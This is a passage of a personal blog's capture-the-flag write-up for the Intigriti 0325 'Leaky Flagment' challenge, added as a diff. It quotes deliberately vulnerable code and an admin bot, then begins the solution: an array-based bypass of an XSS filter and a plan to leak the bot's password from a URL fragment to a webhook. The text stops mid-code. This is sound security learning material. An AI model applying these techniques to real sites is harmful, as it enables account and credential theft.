@@ -1,0 +1,807 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta
+    name="description"
+    content="Personal blog about Cybersec &amp; other things."
+  />
+  
+    
+      <title>Intigriti Challenge 0325 - Leaky Flagment - Writeup | Salvatore Abello&#39;s Blog</title>
+    
+  
+  <link rel="stylesheet" href="/css/reset.css"/>
+  <link rel="stylesheet" href="/css/font.css"/>
+  <link rel="stylesheet" href="/css/smigle.css"/>
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+</head>
+
+  <body>
+    <div id="root">
+      <header>
+  <div id="brand">
+    <a class="icon-link" href="https://salvatore-abello.github.io/">
+      <img
+        class="icon"
+        src="/images/65adf8e914bdc50b5f5f2e8b91b68cb1.png"
+      />
+    </a>
+    <div class="text">
+      <a href="https://salvatore-abello.github.io/"><h1>Salvatore Abello&#39;s Blog</h1></a>
+      <h3>Hacking &amp; other stuff</h3>
+    </div>
+  </div>
+  <nav>
+    
+      
+        
+        <a href="/"><b>Home</b></a>
+      
+         | 
+        <a href="/whoami/"><b>Whoami</b></a>
+      
+         | 
+        <a href="/achievements/"><b>Achievements</b></a>
+      
+         | 
+        <a href="/posts/"><b>Posts</b></a>
+      
+         | 
+        <a href="/cves/"><b>CVEs</b></a>
+      
+    
+  </nav>
+  <hr />
+</header>
+
+      <div id="content">
+        
+  <main>
+    <article>
+      <h1 class="title">Intigriti Challenge 0325 - Leaky Flagment - Writeup</h1>
+      
+      <div class="post-meta">
+  <strong>
+    <span>Posted on</span>
+    <time>2025-04-01 21:07:39</time>
+    
+    
+  </strong>
+  <span> • 2273 words</span>
+  <span> • 11 minute read</span>
+  
+  
+</div>
+
+      <div class="content"><p>This month, I decided to try to solve my first Intigriti challenge. There were many pieces to put together in order to solve this one, but in the end, I managed to succeed and learned a lot of stuff.</p>
+<h2 id="index">
+  <a class="full-clickable-heading" href="#index">
+    Index
+  </a>
+</h2>
+<ul>
+<li><a href="#index">Index</a></li>
+<li><a href="#leaky-flagment">Leaky Flagment</a></li>
+<li><a href="#overview">Overview</a></li>
+<li><a href="#solution">Solution</a>
+<ul>
+<li><a href="#csrf--json">CSRF &amp; JSON</a></li>
+</ul>
+</li>
+<li><a href="#putting-it-all-together">Putting it all together</a>
+<ul>
+<li><a href="#final-payload">Final payload</a></li>
+</ul>
+</li>
+<li><a href="#conclusion">Conclusion</a></li>
+</ul>
+
+<h2 id="leaky-flagment">
+  <a class="full-clickable-heading" href="#leaky-flagment">
+    Leaky Flagment
+  </a>
+</h2>
+<p><img src="https://gist.github.com/user-attachments/assets/2eff558e-599e-4789-ae07-f9712f82a7b5" alt="image"></p>
+
+<h3 id="overview">
+  <a class="full-clickable-heading" href="#overview">
+    Overview
+  </a>
+</h3>
+<p>The website is a typical note-taking application where you can create a note by providing its title and content. Optionally, the note can be protected by a randomly generated password.
+Although there is a significant amount of code in this challenge, we are only interested in the following components:</p>
+<ul>
+<li><code>pages/auth.js</code>: Handles registration and login.</li>
+<li><code>pages/post.js</code>: Manages note creation and fetching.</li>
+<li><code>pages/track.js</code>, A route that serves JavaScript code and contains an obvious injection:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">userIp</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">headers</span>[<span style="color:#e6db74">&#39;x-user-ip&#39;</span>] <span style="color:#f92672">||</span> <span style="color:#e6db74">&#39;0.0.0.0&#39;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">jsContent</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$(document).ready(function() {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    const userDetails = {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        ip: &#34;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">userIp</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        type: &#34;client&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        timestamp: new Date().toISOString(),
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        ipDetails: {}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    };
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    window.ipAnalytics = {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        track: function() {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            return {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                ip: userDetails.ip,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                timestamp: new Date().toISOString(),
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                type: userDetails.type,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                ipDetails: userDetails.ipDetails
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            };
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        }
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    };
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">});`</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">userIp</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;0.0.0.0&#39;</span>) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">200</span>).<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">jsContent</span>)
+</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">200</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;&#39;</span>);
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><ul>
+<li><code>app/note/[id]/page.jsx</code>,  The page that handles notes with an HTML injection.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">CardContent</span> <span style="color:#a6e22e">className</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;flex-1 pt-6 border-t border-rose-100&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">className</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;bg-white/80 backdrop-blur-sm p-8 rounded-xl border border-rose-200 shadow-sm min-h-[400px]&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">div</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">className</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;prose max-w-none text-gray-700 whitespace-pre-wrap break-words&#34;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">dangerouslySetInnerHTML</span><span style="color:#f92672">=</span><span style="color:#e6db74">{{</span> <span style="color:#a6e22e">__html:</span> <span style="color:#a6e22e">note</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#a6e22e">content</span> <span style="color:#960050;background-color:#1e0010">}}</span>
+</span></span><span style="display:flex;"><span>    /&gt;
+</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">CardContent</span>&gt;
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><ul>
+<li><code>app/protected-note/page.jsx</code>, the page that handles protected password notes and implements a <code>message</code> event listener.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>    <span style="color:#a6e22e">useEffect</span>(() =&gt; {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(window.<span style="color:#a6e22e">opener</span>){
+</span></span><span style="display:flex;"><span>        window.<span style="color:#a6e22e">opener</span>.<span style="color:#a6e22e">postMessage</span>({ <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;childLoaded&#34;</span> }, <span style="color:#e6db74">&#34;*&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">setisMounted</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">handleMessage</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">event</span>) =&gt; {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">type</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;submitPassword&#34;</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">validatepassword</span>(<span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">password</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        window.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;message&#34;</span>, <span style="color:#a6e22e">handleMessage</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> () =&gt; window.<span style="color:#a6e22e">removeEventListener</span>(<span style="color:#e6db74">&#34;message&#34;</span>, <span style="color:#a6e22e">handleMessage</span>);
+</span></span><span style="display:flex;"><span>    }, []);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">validatepassword</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">submittedpassword</span>) =&gt; {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">notes</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">localStorage</span>.<span style="color:#a6e22e">getItem</span>(<span style="color:#e6db74">&#34;notes&#34;</span>) <span style="color:#f92672">||</span> <span style="color:#e6db74">&#34;[]&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">foundNote</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">notes</span>.<span style="color:#a6e22e">find</span>(<span style="color:#a6e22e">note</span> =&gt; <span style="color:#a6e22e">note</span>.<span style="color:#a6e22e">password</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">submittedpassword</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;NOTES&#34;</span>, <span style="color:#a6e22e">notes</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">foundNote</span>, <span style="color:#a6e22e">submittedpassword</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">foundNote</span>) {
+</span></span><span style="display:flex;"><span>            window.<span style="color:#a6e22e">opener</span>.<span style="color:#a6e22e">postMessage</span>({ <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;success&#34;</span>, <span style="color:#a6e22e">noteId</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">foundNote</span>.<span style="color:#a6e22e">id</span> }, <span style="color:#e6db74">&#34;*&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">setIsSuccess</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            window.<span style="color:#a6e22e">opener</span>.<span style="color:#a6e22e">postMessage</span>({ <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;error&#34;</span> }, <span style="color:#e6db74">&#34;*&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">setIsSuccess</span>(<span style="color:#66d9ef">false</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    };
+</span></span></code></pre></div><ul>
+<li><code>middleware.js</code>, which processes two paths:</li>
+<li>If the path begins with <code>/view_protected_note</code> and there is a query parameter named <code>id</code> that matches the regex <code>/^[^\-]{8}-[^\-]{4}-[^\-]{4}-[^\-]{4}-[^\-]{12}$/</code>, then the current URL is rewritten as <code>/note/</code> plus the normalized note ID.</li>
+<li>If the path begins with <code>/note/</code> and there is no query parameter named <code>s</code>, the user is redirected to <code>/note/&lt;note-id&gt;?s=true#:~:&lt;username&gt;:&lt;password&gt;</code>. (Note that the user password is placed after the <a href="https://developer.mozilla.org/en-US/docs/Web/URI/Reference/Fragment/Text_fragments#syntax">fragment directive</a>)</li>
+</ul>
+<p>Furthermore, the following headers will be set for specified paths:</p>
+<ul>
+<li>For every path, the following headers will be sent:
+<ul>
+<li><code>Content-Security-Policy: frame-ancestors 'none'; base-uri 'none';  object-src 'none'; frame-src 'none';</code></li>
+<li><code>X-Frame-Options: DENY</code></li>
+<li><code>X-Content-Type-Options: nosniff</code></li>
+<li><code>Referrer-Policy: no-referrer</code></li>
+</ul>
+</li>
+<li>If the path ends with <code>.js</code>, the header <code>Cache-Control: public, max-age=120, immutable</code> is sent</li>
+</ul>
+<p>Because since this is a client-side challenge, there&rsquo;s obviously a bot that simulates a user (the admin):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">driver</span>.<span style="color:#a6e22e">executeScript</span>(<span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">flag</span>) =&gt; {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">response</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;/api/auth&#34;</span>, {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;POST&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;Content-Type&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;application/json&#34;</span>,
+</span></span><span style="display:flex;"><span>        },
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">username</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;admin&#34;</span> <span style="color:#f92672">+</span> Math.<span style="color:#a6e22e">floor</span>(Math.<span style="color:#a6e22e">random</span>() <span style="color:#f92672">*</span> <span style="color:#ae81ff">10000000</span>),
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">password</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">flag</span>
+</span></span><span style="display:flex;"><span>        }),
+</span></span><span style="display:flex;"><span>      });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">ok</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#e6db74">`Bot failed to authenticate! status: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">status</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">driver</span>.<span style="color:#a6e22e">quit</span>();
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">localStorage</span>.<span style="color:#a6e22e">setItem</span>(<span style="color:#e6db74">&#39;isAuthenticated&#39;</span>, <span style="color:#e6db74">&#39;true&#39;</span>);
+</span></span><span style="display:flex;"><span>    }, <span style="color:#a6e22e">flag</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Navigating to URL: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">url</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">driver</span>.<span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">url</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">driver</span>.<span style="color:#a6e22e">wait</span>(<span style="color:#66d9ef">async</span> () =&gt; {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">driver</span>.<span style="color:#a6e22e">executeScript</span>(<span style="color:#e6db74">&#39;return document.readyState&#39;</span>)) <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;complete&#39;</span>;
+</span></span><span style="display:flex;"><span>    }, <span style="color:#a6e22e">timeout</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">viewportSize</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">driver</span>.<span style="color:#a6e22e">executeScript</span>(() =&gt; {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">width</span><span style="color:#f92672">:</span> window.<span style="color:#a6e22e">innerWidth</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">height</span><span style="color:#f92672">:</span> window.<span style="color:#a6e22e">innerHeight</span>,
+</span></span><span style="display:flex;"><span>      };
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">centerX</span> <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">floor</span>(<span style="color:#a6e22e">viewportSize</span>.<span style="color:#a6e22e">width</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">centerY</span> <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">floor</span>(<span style="color:#a6e22e">viewportSize</span>.<span style="color:#a6e22e">height</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">actions</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">driver</span>.<span style="color:#a6e22e">actions</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">actions</span>.<span style="color:#a6e22e">move</span>({ <span style="color:#a6e22e">x</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">centerX</span>, <span style="color:#a6e22e">y</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">centerY</span> }).<span style="color:#a6e22e">click</span>().<span style="color:#a6e22e">perform</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Clicking at center: (</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">centerX</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">centerY</span><span style="color:#e6db74">}</span><span style="color:#e6db74">)`</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">driver</span>.<span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">60000</span>);
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>The admin will:</p>
+<ul>
+<li>Visit the challenge page URL.</li>
+<li>Log in using the flag as the password.</li>
+<li>Navigate to the provided URL.</li>
+<li>Click at the center of the page.</li>
+<li>Wait 60 seconds before closing the browser.</li>
+</ul>
+<p>The goal of this challenge is to leak the admin password!</p>
+<style type="text/css">
+     
+    .notice {
+        --title-color: #fff;
+        --title-background-color: #6be;
+        --content-color: #444;
+        --content-background-color: #e7f2fa;
+    }
+
+    .notice.info {
+        --title-background-color: #fb7;
+        --content-background-color: #fec;
+    }
+
+    .notice.tip {
+        --title-background-color: #5a5;
+        --content-background-color: #efe;
+    }
+
+    .notice.warning {
+        --title-background-color: #c33;
+        --content-background-color: #fee;
+    }
+
+     
+    @media (prefers-color-scheme:dark) {
+        .notice {
+            --title-color: #fff;
+            --title-background-color: #069;
+            --content-color: #ddd;
+            --content-background-color: #023;
+        }
+
+        .notice.info {
+            --title-background-color: #a50;
+            --content-background-color: #420;
+        }
+
+        .notice.tip {
+            --title-background-color: #363;
+            --content-background-color: #121;
+        }
+
+        .notice.warning {
+            --title-background-color: #800;
+            --content-background-color: #400;
+        }
+    }
+
+    body.dark .notice {
+        --title-color: #fff;
+        --title-background-color: #069;
+        --content-color: #ddd;
+        --content-background-color: #023;
+    }
+
+    body.dark .notice.info {
+        --title-background-color: #a50;
+        --content-background-color: #420;
+    }
+
+    body.dark .notice.tip {
+        --title-background-color: #363;
+        --content-background-color: #121;
+    }
+
+    body.dark .notice.warning {
+        --title-background-color: #800;
+        --content-background-color: #400;
+    }
+
+    .notice {
+        --title-color: #fff;
+        --title-background-color: #bd31bd;
+        --content-color: #ddd;
+        --content-background-color: #5d0269;
+    }
+
+    .notice.info {
+        --title-background-color: #a50;
+        --content-background-color: #420;
+    }
+
+    .notice.tip {
+        --title-background-color: #363;
+        --content-background-color: #121;
+    }
+
+    .notice.warning {
+        --title-background-color: #800;
+        --content-background-color: #400;
+    }
+
+     
+    .notice {
+        padding: 18px;
+        line-height: 24px;
+        margin-bottom: 24px;
+        border-radius: 4px;
+        color: var(--content-color);
+        background: var(--content-background-color);
+    }
+
+    .notice p:last-child {
+        margin-bottom: 0
+    }
+
+     
+    .notice-title {
+        margin: -18px -18px 12px;
+        padding: 4px 18px;
+        border-radius: 4px 4px 0 0;
+        font-weight: 700;
+        color: var(--title-color);
+        background: var(--title-background-color);
+    }
+
+     
+    .icon-notice {
+        display: inline-flex;
+        align-self: center;
+        margin-right: 8px;
+    }
+
+    .icon-notice img,
+    .icon-notice svg {
+        height: 1em;
+        width: 1em;
+        fill: currentColor;
+    }
+
+    .icon-notice img,
+    .icon-notice.baseline svg {
+        top: .125em;
+        position: relative;
+    }
+</style><div class="notice note" >
+    <p class="notice-title">
+        <span class="icon-notice baseline">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 128 300 300">
+  <path d="M150 128c82.813 0 150 67.188 150 150 0 82.813-67.188 150-150 150C67.187 428 0 360.812 0 278c0-82.813 67.188-150 150-150Zm25 243.555v-37.11c0-3.515-2.734-6.445-6.055-6.445h-37.5c-3.515 0-6.445 2.93-6.445 6.445v37.11c0 3.515 2.93 6.445 6.445 6.445h37.5c3.32 0 6.055-2.93 6.055-6.445Zm-.39-67.188 3.515-121.289c0-1.367-.586-2.734-1.953-3.516-1.172-.976-2.93-1.562-4.688-1.562h-42.968c-1.758 0-3.516.586-4.688 1.563-1.367.78-1.953 2.148-1.953 3.515l3.32 121.29c0 2.734 2.93 4.882 6.64 4.882h36.134c3.515 0 6.445-2.148 6.64-4.883Z"/>
+</svg>
+
+        </span>Note</p><p>The session cookie, which contains the password, is set with <code>HttpOnly=true</code>.</p></div>
+
+
+<h2 id="solution">
+  <a class="full-clickable-heading" href="#solution">
+    Solution
+  </a>
+</h2>
+<p>First, we needed to obtain XSS. We discovered an HTML injection early on, which indicated that is possible to achieve XSS. However, we had to bypass a server-side check that examined the note’s content for the characters <code>&lt;</code> or <code>&gt;</code>. The check is only performed if <code>content</code> is a string. To bypass it, we send an array containing our payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">content</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;string&#39;</span> <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">content</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;&lt;&#39;</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">content</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;&gt;&#39;</span>))) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>).<span style="color:#a6e22e">json</span>({ <span style="color:#a6e22e">message</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Invalid value for title or content&#39;</span> });
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><img src="https://gist.github.com/user-attachments/assets/48a5608d-9758-42a7-8454-e0512cc08499" alt="image"></p>
+<p>Next, our goal was to send our webhook the fragment containing the password. However, when navigating to a URL like <code>https://challenge-0325.intigriti.io/note/&lt;note-id&gt;?s=true#:~:&lt;username&gt;:&lt;password&gt;</code> and attempting to print <code>window.location.hash</code>, an empty string is returned. This behavior is explained in the documentation for fragment directives, which indicates that the <code>:~:</code> sequence is used for user-agent instructions that are stripped from the URL during loading.</p>
+<p>Nice. Our goal is to send our webhook to the fragment containing the password. Hoever, when navigating to a URL like <code>https://challenge-0325.intigriti.io/note/&lt;note-id&gt;?s=true#:~:&lt;username&gt;:&lt;password&gt;</code> and attempting to print <code>window.location.hash</code>, an empty string is returned. This behavior is explained <a href="https://developer.mozilla.org/en-US/docs/Web/URI/Reference/Fragment/Text_fragments#syntax">here</a></p>
+<div class="notice note" >
+    <p class="notice-title">
+        <span class="icon-notice baseline">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 128 300 300">
+  <path d="M150 128c82.813 0 150 67.188 150 150 0 82.813-67.188 150-150 150C67.187 428 0 360.812 0 278c0-82.813 67.188-150 150-150Zm25 243.555v-37.11c0-3.515-2.734-6.445-6.055-6.445h-37.5c-3.515 0-6.445 2.93-6.445 6.445v37.11c0 3.515 2.93 6.445 6.445 6.445h37.5c3.32 0 6.055-2.93 6.055-6.445Zm-.39-67.188 3.515-121.289c0-1.367-.586-2.734-1.953-3.516-1.172-.976-2.93-1.562-4.688-1.562h-42.968c-1.758 0-3.516.586-4.688 1.563-1.367.78-1.953 2.148-1.953 3.515l3.32 121.29c0 2.734 2.93 4.882 6.64 4.882h36.134c3.515 0 6.445-2.148 6.64-4.883Z"/>
+</svg>
+
+        </span>Note</p><p><code>:~:</code> Otherwise known as the fragment directive, this sequence of characters tells the browser that what comes next is one or more user-agent instructions, which are stripped from the URL during loading so that author scripts cannot directly interact with them. User-agent instructions are also called directives.</p></div>
+
+<p>Since <code>window.location.hash</code> does not contain what we want, I looked for another property that might contain the text fragment. I even wrote a small function to recursively search for <code>:~:</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">searchTextFragment</span>(<span style="color:#a6e22e">obj</span>, <span style="color:#a6e22e">path</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;root&#39;</span>, <span style="color:#a6e22e">visited</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Set</span>()) {
